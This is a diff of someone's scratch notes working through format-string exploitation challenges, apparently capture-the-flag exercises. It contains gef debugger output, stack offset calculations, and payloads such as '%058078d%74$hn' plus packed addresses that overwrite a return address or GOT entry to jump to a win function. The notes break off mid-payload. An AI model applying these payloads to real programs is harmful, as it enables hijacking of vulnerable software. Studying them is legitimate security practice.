@@ -132,6 +132,7 @@ gef➤  x/s $rdi
 0x7ffd42120fb0:	"Your input is:", ' ' <repeats 107 times>, "\nAAAAAA\n" = 122/8 = 15, 2 padding
 0x7ffd42120fb0 (rdi) - 0x7ffd42120dd0(rsp) = 480/8 = 60
 60 + 122/8 (input) + 6 = 60 + 15 + 6 = 81, 2 remiander
+win_addr_val = rip_func - 0x1735 + 0x1330
 
 ============ ch 4=========
 0000000000401150 <memset@plt>:
@@ -238,4 +239,45 @@ buf = b"%04199050d%76$ln" + p64(0x404070)
 60 + 14 + 68 + 1 = 143 + 6 = 149
 563/8 = 70 + 6 = 76
 
-===============================
+=============================== 3 ========
+b *func+525
+b *main+341
+0x7fffd19b8310 (main rbp) - func rbp (0x7fffd19b82c0) = 80
+0x7fffd19b7ea0: "Your input is:", ' ' <repeats 67 times>, "\n%198$p\n" = 14+67+1=82/8=10, 82%2=2
+0x7fffd19b7ea0 rdi - 0x7fffd19b7d30 rsp= 368
+
+0x7fffd19b82c0 rbp - 0x7fffd19b7d30 rsp= 1424/8 = 178+6 = 184
+
+0x7ffd0dc18430 = rbp , 0x5653f93886ba
+
+0x7ffeb9d8d188 rbp+8 - 0x7ffeb9d8cbf0  rsp = 1432/8 = 179+6=185
+
+rbp            0x7ffecc553ba0
+
+0000000000001330 <win>:
+    1705:       e8 70 fc ff ff          callq  137a <func>
+    170a:       b8 00 00 00 00          mov    $0x0,%eax
+
+>>> 0xe330 - 82
+58078    
+
+0x7fff3a1c1640 - 0x7fff3a1c14d0 = 368/8=46 (rdi-rsp)/8=368/8=46
+46+6+10(82/8)=72 + 2 remiander 
+payload=b"%058078d%74$hn"+p64(rip_func)
+
+================= 5 =====================
+<+341>:   call   0x40129d <func>
+<+344>:   call   0x401110 <printf@plt>
+0x7ffe03718390 - 0x7ffe03717f10 = rbp -rsp = 1152/8=144
+0x7ffe49d3f530 - 0x7ffe49d3f4e0 = 80 (rbp main - rbp func)
+0x7fffad1fd4c0: "Your input is:", ' ' <repeats 26 times>, "\n%150$p\n%150$p\n"  // gef➤  x/s $rdi  = 14+26+1(new line char)=41
+
+0000000000401160 <exit@plt>:
+  401160:       f3 0f 1e fa             endbr64 
+  401164:       f2 ff 25 f5 2e 00 00    bnd jmpq *0x2ef5(%rip)        # 404060 <exit@GLIBC_2.2.5>
+  40116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
+
+rdi - rsp = 0x7ffdaa7d4b90 - 0x7ffdaa7d4b30 = 96/8 = 12
+12 + 6 (for stack args) + 41 / 8 (input string) = 18 + 5 = 23 and 1 remiander
+
+payload = %0
